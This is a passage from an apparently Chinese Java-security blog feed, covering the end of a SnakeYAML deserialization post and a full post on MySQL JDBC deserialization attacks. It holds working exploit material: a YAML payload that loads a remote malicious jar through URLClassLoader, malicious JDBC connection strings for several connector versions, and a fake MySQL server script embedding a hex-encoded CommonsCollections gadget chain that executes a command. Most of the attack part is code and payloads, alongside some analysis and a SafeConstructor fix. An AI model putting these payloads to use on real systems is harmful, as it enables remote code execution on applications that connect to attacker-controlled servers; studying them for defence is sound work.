class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getEngineName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getEngineVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> <span class="token function">getExtensions</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> <span class="token function">getMimeTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> <span class="token function">getNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getLanguageName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getLanguageVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getMethodCallSyntax</span><span class="token punctuation">(</span><span class="token class-name">String</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> m<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getOutputStatement</span><span class="token punctuation">(</span><span class="token class-name">String</span> toDisplay<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getProgram</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> statements<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">ScriptEngine</span> <span class="token function">getScriptEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>编写对应文件，并使用maven进行打包生成jar 包，<br><img src="/img/1-22/14.png"></p><p>在生成的jar包目录下使用python开启一个http服务<br><img src="/img/1-22/15.png"><br><a name="EsfJx"></a></p><h2 id=""><a href="#" class="headerlink" title=""></a><br></h2><p>将payload改为</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">!</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLClassLoader</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span>java<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token constant">URL</span> <span class="token punctuation">[</span><span class="token string">"http://127.0.0.1:7788/exp.jar"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><p>这里是利用URLClassLoader对jar包的远程加载功能，最后执行代码，成功弹出计算器<br><img src="/img/1-22/16.png"><br><a name="C3J1V"></a></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><br></h2><p><a name="PiHkH"></a></p><h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p>SPI的特点就是查找所有的服务后封装到ServiceLoad,并使用迭代器进行类加载</p><p>省略前面查找服务的过程<br>在initEnages方法中，迭代器迭代所有查找到的服务<br><img src="/img/1-22/17.png"><br>进入next方法中<br><img src="/img/1-22/18.png"><br>继续进入next,再进入nextService中<br>这里就会根据类加载器，进行类加载，并实例化对象<br><img src="/img/1-22/19.png"><br>这就是这条链子的终点，恶意类加载，最终rce</p><p><a name="h1k2F"></a></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>其实该漏洞涉及到了全版本，只要反序列化内容可控,那么就可以去进行反序列化攻击<br>修复方案：加入new SafeConstructor()类进行过滤</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> main <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> context <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [\n"</span> <span class="token operator">+</span>                <span class="token string">"  !!java.net.URLClassLoader [[\n"</span> <span class="token operator">+</span>                <span class="token string">"    !!java.net.URL [\"http://127.0.0.1:8888/yaml-payload-master.jar\"]\n"</span> <span class="token operator">+</span>                <span class="token string">"  ]]\n"</span> <span class="token operator">+</span>                <span class="token string">"]"</span><span class="token punctuation">;</span>        <span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SafeConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>结果：<br></p><img src="/img/1-22/20.png"><p>这只是SnakeYaml反序列化漏洞的一部分哦~</p><h2 id="复习总结"><a href="#复习总结" class="headerlink" title="复习总结"></a><strong>复习总结</strong></h2><p>这里只是简单介绍了SnakeYaml反序列化漏洞，不同的数据类型稍有不同，当数据为键值对时，会调用构造方法和setter方法。当数据是数组时候会调用构造方法，其中一条攻击链就是利用SPI机制来加载恶意类</p><p>续集：SnakeYaml反序列化漏洞攻击链，可暂时参考：<a href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/">SnakeYAML反序列化及可利用Gadget</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> web </tag>
            
            <tag> SnakeYaml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDBC反序列化攻击</title>
      <link href="/2023/12/26/jdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/12/26/jdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="JDBC反序列化攻击"><a href="#JDBC反序列化攻击" class="headerlink" title="JDBC反序列化攻击"></a>JDBC反序列化攻击</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>JDBC（Java DataBase Connectivity）是一种用于执行Sql语句的Java Api，即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，可以为多种关系数据库提供统一访问，提供了诸如查询和更新数据库中数据的方法，是Java访问数据库的标准规范。简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。</p><p>Mysql JDBC 中包含一个危险的扩展参数： “autoDeserialize”。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据，造成RCE漏洞。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><blockquote><p>JDBC定义了一个叫<strong>java.sql.Driver</strong>的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。<strong>java.sql.DriverManager.getConnection(xxx)<strong>其实就是间接的调用了</strong>java.sql.Driver</strong>类的<strong>connect</strong>方法实现数据库连接的。数据库连接成功后会返回一个叫做<strong>java.sql.Connection</strong>的数据库连接对象，一切对数据库的查询操作都将依赖于这个<strong>Connection</strong>对象。</p></blockquote><p>当连接数据库的时候会执行内置的sql语句来确保连接成功</p><img src="/img/12-26/5.png"><p>当我们伪造返回数据为序列化数据时，使服务器触发反序列化</p><p>入口点是<code>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</code></p><p>很明显这里触发了反序列化</p><img src="/img/12-26/1.png"><p>找调用 <code>getObject</code>的地方。找到了<code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()</code></p><img src="/img/12-26/2.png"><p>在断点的函数里面就调用了<code>getObject</code></p><p><code>ServerStatusDiffInterceptor</code>是一个拦截器，在JDBC URL中设定属性queryInterceptors为<code>ServerStatusDiffInterceptor</code>时，执行查询语句会调用拦截器的preProcess和postProcess方法，而preProcess方法和postProcess方法都调用了<code>populateMapWithSessionStatusValues</code>，进而通过上述调用链最终调用<code>getObject()</code>方法</p><img src="/img/12-26/3.png"><p>在JDBC连接数据库的过程中,会使用内置的sql语句查询确保连接，会调用<code>SHOW SESSION STATUS</code>去查询，然后对结果进行处理的时候会调用<code>resultSetToMap</code>.跟进去，看看resultSetToMap，最终触发getObject</p><h2 id="不同版本的payload"><a href="#不同版本的payload" class="headerlink" title="不同版本的payload"></a>不同版本的payload</h2><p><strong>8.x</strong></p><pre class="language-none"><code class="language-none">"jdbc:mysql://127.0.0.1:3309/test?characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai" +          "&amp;autoDeserialize=true" +      "&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";</code></pre><p><strong>6.x</strong></p><p>属性名不同，queryInterceptors 换为 statementInterceptors</p><pre class="language-none"><code class="language-none">"jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"</code></pre><p>&gt;<strong>=5.1.11</strong></p><p>包名中没有cj</p><pre class="language-none"><code class="language-none">"jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor"</code></pre><p><strong>5.x &lt;= 5.1.10</strong></p><p>同上，但需要连接后执行查询。</p><p><strong>5.1.29 - 5.1.40</strong></p><pre class="language-none"><code class="language-none">"jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true"</code></pre><p><strong>5.1.28 - 5.1.19</strong></p><pre class="language-none"><code class="language-none">"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true"</code></pre><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>我们需要伪造mysql服务端，用来传递反序列化的攻击数据</p><p>mysql服务端POC</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> binascii<span class="token keyword">import</span> osgreeting_data<span class="token operator">=</span><span class="token string">"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"</span>response_ok_data<span class="token operator">=</span><span class="token string">"0700000200000002000000"</span><span class="token keyword">def</span> <span class="token function">receive_data</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Receiveing the package : {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">send_data</span><span class="token punctuation">(</span>conn<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Sending the package : {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_payload_content</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token operator">//</span><span class="token builtin">file</span>文件的内容使用ysoserial生成的 使用规则  java <span class="token operator">-</span>jar ysoserial <span class="token punctuation">[</span>common7那个<span class="token punctuation">]</span>  <span class="token string">"calc"</span> <span class="token operator">&gt;</span> a     <span class="token builtin">file</span><span class="token operator">=</span> <span class="token string">r'a'</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            payload_content <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"open successs"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"open false"</span><span class="token punctuation">)</span>        <span class="token comment">#calc</span>        payload_content<span class="token operator">=</span><span class="token string">'aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'</span>    <span class="token keyword">return</span> payload_content<span class="token comment"># 主要逻辑</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> sk<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Connection come from {}:{}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>addr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># 1.先发送第一个 问候报文</span>        send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span>greeting_data<span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span>            receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>            send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span>response_ok_data<span class="token punctuation">)</span>            <span class="token comment">#其他过程</span>            data<span class="token operator">=</span>receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>            <span class="token comment">#查询一些配置信息,其中会发送自己的 版本号</span>            <span class="token keyword">if</span> <span class="token string">"session.auto_increment_increment"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                _payload<span class="token operator">=</span><span class="token string">'01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'</span>                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span>_payload<span class="token punctuation">)</span>                data<span class="token operator">=</span>receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>            <span class="token keyword">elif</span> <span class="token string">"show warnings"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                _payload <span class="token operator">=</span> <span class="token string">'01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'</span>                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> _payload<span class="token punctuation">)</span>                data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"set names"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> response_ok_data<span class="token punctuation">)</span>                data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"set character_set_results"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> response_ok_data<span class="token punctuation">)</span>                data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"show session status"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                mysql_data <span class="token operator">=</span> <span class="token string">'0100000102'</span>                mysql_data <span class="token operator">+=</span> <span class="token string">'1a000002036465660001630163016301630c3f00ffff0000fc9000000000'</span>                mysql_data <span class="token operator">+=</span> <span class="token string">'1a000003036465660001630163016301630c3f00ffff0000fc9000000000'</span>                <span class="token comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span>                <span class="token operator">//</span>获取payload                payload_content<span class="token operator">=</span>get_payload_content<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token operator">//</span>计算payload长度                payload_length <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload_content<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                payload_length_hex <span class="token operator">=</span> payload_length<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> payload_length<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>                <span class="token operator">//</span>计算数据包长度                data_len <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload_content<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>                data_len_hex <span class="token operator">=</span> data_len<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> data_len<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> data_len<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>                mysql_data <span class="token operator">+=</span> data_len_hex <span class="token operator">+</span> <span class="token string">'04'</span> <span class="token operator">+</span> <span class="token string">'fbfc'</span><span class="token operator">+</span> payload_length_hex                mysql_data <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>payload_content<span class="token punctuation">)</span>                mysql_data <span class="token operator">+=</span> <span class="token string">'07000005fe000022000100'</span>                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> mysql_data<span class="token punctuation">)</span>                data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"show warnings"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                payload <span class="token operator">=</span> <span class="token string">'01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'</span>                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    HOST <span class="token operator">=</span><span class="token string">'0.0.0.0'</span>    PORT <span class="token operator">=</span> <span class="token number">3309</span>    sk <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    <span class="token comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span>    sk<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    sk<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>    sk<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start fake mysql server listening on {}:{}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>    run<span class="token punctuation">(</span><span class="token 